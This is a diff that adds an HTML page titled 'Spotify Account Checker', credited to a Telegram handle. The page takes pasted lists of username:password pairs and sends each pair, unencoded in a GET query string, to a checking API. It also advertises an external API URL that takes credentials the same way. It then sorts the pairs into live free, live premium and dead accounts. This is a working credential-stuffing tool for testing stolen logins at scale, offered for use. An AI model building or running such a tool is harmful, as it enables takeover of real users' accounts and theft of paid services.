@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Spotify Account Checker">
+
+    <title>Spotify Account Checker</title>
+
+    <link href="css/bootstrap.min.css" rel="stylesheet" type="text/css" />
+
+
+</head>
+
+
+<body class="fixed-left">
+
+<div id="wrapper">
+
+    <div class="clearfix"></div>
+    <div class="wrapper-page">
+
+        <div class="m-t-40 card-box">
+            <div class="text-center">
+                <h3 class="text-uppercase font-bold m-b-0">Spotify Account Checker</h3>
+                <h5>Powered By <a href="https://t.me/Grizzly22">@Grizzly22</a></br>Template by @DrWean</h5>
+                <h5>API: https://checkerz.altervista.org/spotify/api/index.php?u=USERNAME&p=PASSOWRD</h5>
+
+
+	</div>
+            <div class="panel-body">
+
+                <div class="alert alert-info" id="done_div" hidden>
+
+                </div>
+                <h3>To Check:</h3>
+                <textarea class="form-control" id="tocheck_acc" style="resize: none;vertical-align:middle;" col="95" rows="5" >Example:
+username:password</textarea>
+
+                <h3>Live: <div id="live_count">0</div></h3>
+                <h4>Free: <div id="live_freec">0</div></h4>
+                <textarea class="form-control" id="live_free" style="resize: none;vertical-align:middle;" col="95" rows="5" ></textarea>
+                <h4>Premium: <div id="live_premiumc">0</div></h4>
+                <textarea class="form-control" id="live_premium" style="resize: none;vertical-align:middle;" col="95" rows="5" ></textarea>
+                <h3>Dead: <div id="dead_count">0</div></h3>
+                <textarea class="form-control" id="dead_acc" style="resize: none;vertical-align:middle;" col="95" rows="5" ></textarea>
+                <div class="form-group text-center m-t-30">
+                    <div class="col-xs-12">
+                        <button type="button" onclick="parse_accounts();" class="btn btn-success btn-trans waves-effect w-md waves-success m-b-5">Check</button>
+                    </div>
+                </div>
+
+
+
+            </div>
+        </div>
+    </div>
+</div>
+
+
+<!-- jQuery  -->
+<script src="js/jquery.min.js"></script>
+
+
+<script type="text/javascript">
+    function parse_accounts(){
+        var accounts = $("#tocheck_acc")[0].value;
+        accounts = accounts.split("\n");
+        accounts.forEach(check);
+        $("#done_div")[0].hidden = false;
+        $("#done_div")[0].innerHTML = "<strong>Check done</strong>";
+
+
+    }
+
+    function check(account){
+        var account = account.split(":");
+        var username = account[0];
+        var password = account[1];
+        $.get( "api/?u=" + username + "&p=" + password, function( data ) {
+            var result_decoded = JSON.parse(data);
+            if(result_decoded.status == "success" && result_decoded.subscription == "FREE") {
+                $("#live_free")[0].value = $("#live_free")[0].value +  username + ":" + password + "|" + result_decoded.subscription + "\n";
+                $("#live_count")[0].innerText = parseInt($("#live_count")[0].innerText) + 1;
+                $("#live_freec")[0].innerText = parseInt($("#live_freec")[0].innerText) + 1;
+            } else if(result_decoded.status == "success" && result_decoded.subscription == "PREMIUM") {
+                $("#live_premium")[0].value = $("#live_premium")[0].value +  username + ":" + password + "|" + result_decoded.subscription + "\n";
+                $("#live_count")[0].innerText = parseInt($("#live_count")[0].innerText) + 1;
+                $("#live_premiumc")[0].innerText = parseInt($("#live_premiumc")[0].innerText) + 1;
+            } else {
+                $("#dead_acc")[0].value = $("#dead_acc")[0].value +  username + ":" + password + "\n";
+                $("#dead_count")[0].innerText = parseInt($("#dead_count")[0].innerText) + 1;
+            }
+
+
+        });
+    }
+</script>
+
+
+</body>
+
+</html>
+
+
